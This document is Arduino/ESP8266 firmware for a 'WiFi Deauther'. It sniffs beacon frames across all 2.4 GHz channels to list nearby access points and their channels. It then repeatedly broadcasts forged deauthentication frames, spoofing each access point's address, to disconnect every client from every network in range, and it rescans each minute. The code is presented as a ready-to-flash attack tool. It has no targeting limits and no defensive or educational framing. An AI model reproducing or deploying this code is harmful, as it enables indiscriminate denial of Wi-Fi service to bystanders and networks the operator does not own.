
#ifdef ESP8266
extern "C" {
#include "ets_sys.h"
#include "osapi.h"
#include "gpio.h"
#include "os_type.h"
#include "user_config.h"
#include "user_interface.h"
}
#endif

// this idea worked
// FOR REMOVING ARRAY ITEM..
// SWITCH LAST ITEM WITH REMOVEABLE ITEM,
// REMOVE THE REMOVABLE ITEM FROM THE END,
// current--

const int size_lim = 50; // NUMBER OF ACCESS POINTS ALLOWED
const int channel_lim = 14; // NUMBER OF CHANNELS
int current = -1; // CURRENT NUMBER OF APs FOUND
int longest_essid = 0; // LENGTH OF THE LONGEST ESSID
int set_channel = 1; // STARTING CHANNEL
int channels[channel_lim] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}; // LIST OF CHANNELS
//int channels[channel_lim] = {1, 11};
 
struct RxControl
{
  signed rssi: 8;
  unsigned rate: 4;
  unsigned is_group: 1;
  unsigned: 1;
  unsigned sig_mode: 2;
  unsigned legacy_length: 12;
  unsigned damatch0: 1;
  unsigned damatch1: 1;
  unsigned bssidmatch0: 1;
  unsigned bssidmatch1: 1;
  unsigned MCS: 7;
  unsigned CWB: 1;
  unsigned HT_length: 16;
  unsigned Smoothing: 1;
  unsigned Not_Sounding: 1;
  unsigned: 1;
  unsigned Aggregation: 1;
  unsigned STBC: 2;
  unsigned FEC_CODING: 1;
  unsigned SGI: 1;
  unsigned rxend_state: 8;
  unsigned ampdu_cnt: 8;
  unsigned channel: 4;
  unsigned: 12;
};
 
struct LenSeq
{
  uint16_t length;
  uint16_t seq;
  uint8_t address3[6];
};
 
struct sniffer_buf
{
  struct RxControl rx_ctrl;
  uint8_t buf[36];
  uint16_t cnt;
  struct LenSeq lenseq[1];
};
 
struct sniffer_buf2
{
  struct RxControl rx_ctrl;
  uint8_t buf[112];
  uint16_t cnt;
  uint16_t len;
};
unsigned long time_ = 0;
unsigned long deauth_time = 0;
unsigned long deauth_cycle = 60000;

// CLASS TO BUILD ACCESS POINT OBJECTS
class AccessPoint
{
  public:
    String essid;
    signed rssi;
    uint8_t bssid[6];
    bool lim_reached = false;
    bool found = false; // VARIABLE FOR RE-SCAN
    int channel;
    int packet_limit = 500;
    int channels[14] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // ARRAY TO HELP DETERMINE ACTIVE CHANNEL
    // ARRAY TO STORE CLIENTS
    int clients[50][6] = {};
    // THANKS spacehuhn
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };
};

AccessPoint access_points[size_lim];

void send_deauth(AccessPoint access_point)
{
  // SET CHANNEL TO AP CHANNEL
  wifi_set_channel(access_point.channel);
  delay(1); // NEED THIS DELAY OR PACKET WILL NOT SEND PROPERLY
  
  // SEND DEAUTH PACKET
  wifi_send_pkt_freedom(access_point.deauthPacket, 26, 0);
}


// FUNCTION TO ADD NEW APs TO THE MASTER LIST OF APs
bool add_access_point(uint8_t bssid[6], int channel, String essid, signed rssi)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;

  // CHECK IF WE ALREADY HAVE THE ACCESS POINT
  for (int i = 0; i < current + 1; i++)
  {
    byte_match = false;
    for (int p = 0; p < 6; p++)
    {
      if (access_points[i].bssid[p] == bssid[p])
        byte_match = true;
      else
      {
        byte_match = false;
        break;
      }
    }

    // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
    if (byte_match == true)
    {
      // MARK IT AS FOUND
      access_points[i].found = true;
      if (access_points[i].lim_reached == false)
      {
        access_points[i].channels[channel - 1]++;
        if (access_points[i].channels[channel - 1] >= access_points[i].packet_limit)
        {
          access_points[i].lim_reached = true;
        }
        for (int c = 1; c < 15; c++)
        {
          if (access_points[i].channels[c - 1] >= access_points[i].channels[largest])
          {
            largest = c - 1;
          }
        }
        if (access_points[i].channel != largest + 1)
        {
          access_points[i].channel = largest + 1;
          Serial.print(access_points[i].essid);
          Serial.print(" -> Updated channel: ");
          Serial.println(access_points[i].channel);
        }
      }
      found = true;
      break;
    }
  }

  // IF THE ACCESS POINT WASN'T ALREADY THERE, ADD IT
  if (found == true)
    return false;
  else
  {
    // BUILD THE OBJECT
    current++;
    if (current == size_lim)
      current = 0;
      
    AccessPoint access_point;
    access_point.channel = channel;
    access_point.channels[channel - 1]++;
    access_point.essid = essid;
    access_point.rssi = rssi;
    access_point.found = true;
    for (int i = 0; i < 6; i++)
    {
      access_point.bssid[i] = bssid[i];
      access_point.deauthPacket[i + 10] = bssid[i];
      access_point.deauthPacket[i + 16] = bssid[i];
    }
    access_points[current] = access_point;

    if (access_point.essid.length() > longest_essid)
      longest_essid = access_point.essid.length();
    
    return true;
  }
}

// FUNCTION TO PRINT THE FULL LIST OF ACCESS POINTS
// EVERY TIME A NEW ONE IS ADDED
void print_aps()
{
  
  Serial.println("-----------------------------");

  
  for (int i = 0; i < current + 1; i++)
  {
    for (int x = 0; x < longest_essid - access_points[i].essid.length(); x++)
      Serial.print(" "); 
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
    {
      if (p != 5)
        Serial.printf("%02x ", access_points[i].bssid[p]);
      else
        Serial.printf("%02x", access_points[i].bssid[p]);
    }
    Serial.print(" | CH: ");
    Serial.print(access_points[i].channel);
    Serial.print(" | RSSI: ");
    Serial.printf("%2d | ", access_points[i].rssi);
    for (int c = 0; c < 14; c++)
    {
      Serial.print(access_points[i].channels[c]);
      Serial.print(", ");
    }
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}
 
// SNIFFER CALLBACK FUNCTION
void ICACHE_FLASH_ATTR promisc_cb(uint8 *buf, uint16 len)
{
  bool limit_reached = false;
  bool found = false;
  bool byte_match;
  int largest = 0;
  
  // CONTROL
  String local_essid = "";
  
  if (len == 12)
    struct RxControl *sniffer = (struct RxControl*) buf;
  
  // I GUESS THIS IS BEACON LENGTH
  else if (len == 128) // 173 or 37
  { 
    bool beacons = true;

    struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;

    if (sniffer->buf[0] == 0x80)
    {
      // LOAD BSSID OF PACKET
      uint8_t byte_arr[6];
      for (int i = 0; i < 6; i++)
      {
        byte_arr[i] = sniffer->buf[i + 10];
      }

      for (int i = 0; i < sniffer->buf[37]; i++)
        local_essid.concat((char)sniffer->buf[i + 38]);
        
      if (add_access_point(byte_arr, set_channel, local_essid, sniffer->rx_ctrl.rssi))
      {
        Serial.print("Beacon -> ");

  
        // BEACON SIZE BYTE IS LOCATED AT 37
        // BEACON ESSID STARTS AT BYTE 38
        for (int i = 0; i < sniffer->buf[37]; i++)
        {
          // PRINT THE ESSID HEX CONVERTED TO CHAR
          Serial.print((char)sniffer->buf[i + 38]);
        }
        Serial.print("\n");
        //print_aps();
      }
    }

  }

  // THIS IS DATA
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
    
    // CHECK IF WE ALREADY HAVE THE ACCESS POINT
    for (int i = 0; i < current + 1; i++)
    {
      byte_match = false;

      // CHECK IF SOURCE IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 10])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }

      // CHECK IF DESTINATION IS AP
      for (int p = 0; p < 6; p++)
      {
        if (access_points[i].bssid[p] == sniffer->buf[p + 4])
          byte_match = true;
        else
        {
          byte_match = false;
          break;
        }
      }
  
      // IF WE GET A REPEAT BEACON, UPDATE ITS OBJECT
      if (byte_match == true)
      {
        if (access_points[i].lim_reached == false)
        {
          access_points[i].channels[set_channel - 1]++;
          if (access_points[i].channels[set_channel - 1] >= access_points[i].packet_limit)
          {
            access_points[i].lim_reached = true;
          }
        }
      }
    }
  }
  /*
  else
  {
    struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;

    Serial.printf("%02x | ", sniffer->buf[0]);

    // PRINT SOURCE ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 10]);
    }

    Serial.print(" -> ");

    // PRINT DEST ADDR
    for (int p = 0; p < 6; p++)
    {
      Serial.printf("%02x ", sniffer->buf[p + 4]);
    }
    
    Serial.printf(" || RSSI: %2d (%d ms)\n", sniffer->rx_ctrl.rssi, millis() - time_);
    time_ = millis();
  }
  */
}

// FUNCTION TO SHOW THE DEAUTH PACKETS THAT WILL BE TRANSMITTED
void show_deauth()
{
  Serial.print("Deauthenticating clients from ");
  Serial.print(current + 1);
  Serial.println(" access points");
  Serial.println("-----------------------------");
  for (int i = 0; i <= current; i++)
  {
    Serial.print(access_points[i].channel);
    Serial.print(" | ");
    Serial.print(access_points[i].essid);
    Serial.print(" -> ");
    for (int p = 0; p < 6; p++)
      Serial.printf("%02x ", access_points[i].deauthPacket[p + 10]);
    Serial.print("\n");
  }
  Serial.println("-----------------------------");
}

// VOID TO MOVE DEAD AP TO END OF LIST AND ADJUST CURRENT
void remove_element(int index)
{
  AccessPoint temp = access_points[index];
  Serial.print("[!] Not found in scan | Removing -> ");
  Serial.println(temp.essid);
  access_points[index] = access_points[current];
  access_points[current] = temp;
  current--;
  Serial.print("[!] New Current -> ");
  Serial.println(current);
}

void clean_ap_list()
{
  Serial.println("[!] Cleaning AP list...");
  for (int i = 0; i <= current; i++)
  {
    if (access_points[i].found == false)
      remove_element(i);
  }
}

// FUNCTION TO SCAN FOR ACCESS POINTS
void scan()
{
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(promisc_cb);
  wifi_promiscuous_enable(1);
  Serial.println("[!] Scanning for APs...");

  for (int i = 0; i <= current; i++)
    access_points[i].found = false;
  
  for (int i = 0; i < 2; i++)
  {
    for (int p = 0; p < channel_lim; p++)
    {
      set_channel = channels[p];
      wifi_set_channel(set_channel);
      delay(1000);
    }
    Serial.println("[!] Completed one scan");
  }
  Serial.println("[!] Done scanning");
  clean_ap_list();
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(0);
  wifi_promiscuous_enable(1);
}
 
void setup() {
  //pinMode(LED_BUILTIN, OUTPUT);
  //digitalWrite(LED_BUILTIN, LOW);
  Serial.begin(2000000);
  Serial.println("[!] WiFi Deauther");
  Serial.println("[!] Initializing...\n\n");
  wifi_set_opmode(0x1);
  wifi_set_channel(set_channel);
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(promisc_cb);
  //wifi_promiscuous_enable(1);
  Serial.println("[!] Init finished\n\n");
  time_ = millis();

  // DO 2 SCANS
  scan();
  deauth_time = millis();
  Serial.print("Current time -> ");
  Serial.print(deauth_time);
  Serial.println("ms");
  //wifi_promiscuous_enable(0);
  //wifi_set_promiscuous_rx_cb(0);
  //wifi_promiscuous_enable(1);

  show_deauth();
}

// CYCLE THROUGH CHANNELS IN THE MAIN LOOP
void loop(){
/*
  if (set_channel > 14)
    set_channel = 1;
  wifi_set_channel(set_channel);
  delay(2000);
  set_channel++;
*/
  if (millis() - deauth_time > deauth_cycle)
  {
    Serial.print("Deauth ");
    Serial.print(deauth_cycle);
    Serial.println("ms mark");
    scan();
    show_deauth();
    deauth_time = millis();
  }
  for (int i = 0; i <= current; i++)
    send_deauth(access_points[i]);
  //Serial.println("Deauthed");
  delay(1);

}
